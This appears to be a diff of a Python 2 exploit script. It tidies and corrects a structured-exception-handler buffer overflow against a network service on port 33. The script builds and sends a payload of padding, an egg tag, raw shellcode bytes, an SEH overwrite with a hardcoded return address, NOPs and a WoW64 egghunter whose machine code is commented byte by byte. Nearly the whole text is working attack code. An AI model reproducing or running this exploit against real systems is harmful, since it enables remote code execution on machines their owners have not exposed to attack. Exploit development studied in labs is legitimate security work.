@@ -5,14 +5,6 @@ import socket
 ip = sys.argv[1]
 socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 socket.connect((ip , 33))
-#test
-
-# evil = "A"* 330
-# junk = "A" * 50
-# tag = "DaltDalt"
-# nseh = "\xeb\x06\x90\x90"
-# seh = "\xdb\x65\x41\x00" #004165db
-# nops = "\x90"*100
 
 
 #modern egghunter for wow64 - Windows 7
@@ -45,6 +37,8 @@ eggh = (
 "\x75\xe1"                            # JNZ SHORT 0043F001
 "\xFF\xE7"                            # JMP EDI
 )
+
+
 shellcode = (
 "\xe8\x00\x00\x00\x00\x5a\x8d\x52"
 "\xfb\x52\xbb\x8e\xfe\x1f\x4b\xe8"
@@ -80,10 +74,7 @@ shellcode = (
 "\x00\x00\x01\x00\x00\x00"
 )
 
-# shellcode = "DaltDalt" + shellcode
-# partA_len = len(evil) - len(eggh)
-# shellA = shellcode[:partA_len]
-# shellB = shellcode[partA_len:]
+
 
 
 # payload = evil + nseh + seh + nops + shellcode
@@ -97,11 +88,13 @@ tag = "DaltDalt"
 nseh = "\xeb\x06\x90\x90"
 seh = "\xdb\x65\x41\x00" #004165db
 nops = "\x90"*100
-morejunk = "B" * (330-(len(junk)-len(tag)-len(shellcode)))
+morejunk = "B" * (330-(len(junk)+len(tag)+len(shellcode)))
 
-
-
+# Full payload calculation
 payload = junk + tag + shellcode + morejunk + nseh + seh + nops + eggh
+
+
+
 socket.send(payload)
 d = socket.recv(1024)
 print d
